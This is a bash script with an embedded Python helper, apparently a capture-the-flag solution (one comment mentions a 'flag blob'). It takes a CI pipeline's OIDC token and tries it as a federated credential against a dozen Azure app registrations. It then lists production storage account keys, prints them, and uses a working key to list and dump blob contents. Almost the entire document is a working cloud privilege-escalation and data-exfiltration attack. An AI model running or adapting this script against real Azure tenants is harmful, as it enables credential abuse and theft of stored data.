#!/usr/bin/env bash
set +e

TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
RG="rg-tbl-platform-prod-sea"
ARM_API="https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}"

echo "===SWEEP_START==="

JWT=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "OIDC_LEN=${#JWT}"
[ -z "$JWT" ] && { echo "NO_OIDC"; exit 0; }

# candidate app registrations that may each hold a federated credential for this OIDC subject
IDS="7c2e61eb-f928-45cd-99c9-20da958dd216:directory-sync
891fb158-e02c-4428-a885-53b811f369c0:legacy-admin
6eb124e3-de61-4fc9-a124-213d98d737f5:reporting-insights
7a85156a-01c4-4e61-8472-40a92107159b:reporting-writer-mi
eeab432e-1bf6-400e-b155-a28ce7cafcdb:storefront-sysmi
12ed54de-f2eb-4784-804c-3a7a3e83a9e9:reporting-service
881fddce-6208-4af5-a297-7e79c912f83c:reporting-viewer
58108da8-044e-4d7e-9a46-92e6179b30be:secrets-sync
462d1c38-4459-48b8-9333-82e389e59514:platform-automation
72ff278a-9e71-43ec-bac4-2ca303f8e462:cicd-deployer
038bc35d-131d-4953-9985-ff4a245ccec1:cost-reader
2c34300e-1bc0-41e7-9c1e-8b7571d72c72:directory-audit"

WORKING_KEY=""
WORKING_SA=""
WORKING_CID=""

for LINE in $IDS; do
  CID="${LINE%%:*}"; NAME="${LINE##*:}"
  AT=$(curl -sS -m 25 -X POST "https://login.microsoftonline.com/${TID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${CID}" -d grant_type=client_credentials \
    --data-urlencode "scope=https://management.azure.com/.default" \
    -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
    --data-urlencode "client_assertion=${JWT}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
  if [ -z "$AT" ]; then echo "FIC_FAIL ${NAME} (${CID})"; continue; fi
  echo "FIC_OK ${NAME} (${CID}) arm_len=${#AT}"
  for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
    R=$(curl -sS -m 15 -X POST "${ARM_API}/providers/Microsoft.Storage/storageAccounts/${SA}/listKeys?api-version=2023-01-01" \
      -H "Authorization: Bearer ${AT}" -H "Content-Length: 0")
    CODE=$(echo "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("error",{}).get("code","OK"))' 2>/dev/null)
    if [ "$CODE" = "OK" ]; then
      echo "LISTKEYS_OK ${NAME} ${SA}"
      echo "KEYS_${SA}: $(echo "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(json.dumps([{k["keyName"]:k["value"]} for k in d["keys"]]))' 2>/dev/null)"
      if [ -z "$WORKING_KEY" ]; then
        WORKING_KEY=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin)["keys"][0]["value"])' 2>/dev/null)
        WORKING_SA="$SA"; WORKING_CID="${NAME}"
      fi
    else
      echo "LISTKEYS_DENY ${NAME} ${SA} code=${CODE}"
    fi
  done
done

echo "===WORKING=${WORKING_CID} SA=${WORKING_SA} keylen=${#WORKING_KEY}==="

if [ -n "$WORKING_KEY" ]; then
  # read flag blob directly via SharedKey
  python3 - "$WORKING_SA" "$WORKING_KEY" <<'PYEOF'
import sys, base64, hashlib, hmac, datetime, urllib.request, json
account, key = sys.argv[1], sys.argv[2]
kb = base64.b64decode(key)
def auth(canon):
    d = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    v = "2019-12-12"
    sts = "\n".join(["GET"] + [""]*11 + [f"x-ms-date:{d}\nx-ms-version:{v}", canon])
    sig = base64.b64encode(hmac.new(kb, sts.encode(), hashlib.sha256).digest()).decode()
    return {"x-ms-date": d, "x-ms-version": v, "Authorization": f"SharedKey {account}:{sig}"}
def get(path, canon):
    req = urllib.request.Request(f"https://{account}.blob.core.windows.net/{path}", headers=auth(canon))
    return urllib.request.urlopen(req, timeout=20).read()
# list containers
try:
    import xml.etree.ElementTree as ET
    ns={'a':'http://schemas.microsoft.com/windowsazure'}
    data = get("?comp=list", f"/{account}/\ncomp:list")
    conts = [c.find('a:Name', ns).text for c in ET.fromstring(data).findall('.//a:Container', ns)]
    print("CONTAINERS:", json.dumps(conts))
    for c in conts:
        try:
            bd = get(f"{c}?restype=container&comp=list", f"/{account}/{c}\ncomp:list\nrestype:container")
            for b in ET.fromstring(bd).findall('.//a:Blob', ns):
                name = b.find('a:Name', ns).text
                size = int(b.find('a:Properties/a:Content-Length', ns).text)
                print(f"BLOB {c}/{name} size={size}")
                if size < 200000:
                    try:
                        content = get(f"{c}/{name}", f"/{account}/{c}/{name}")
                        print(f"--- CONTENT {c}/{name} ---")
                        print(content.decode('utf-8','replace'))
                    except Exception as e:
                        print(f"read err {c}/{name}: {e}")
        except Exception as e:
            print(f"list err {c}: {e}")
except Exception as e:
    print(f"container err: {e}")
PYEOF
fi

echo "===SWEEP_END==="
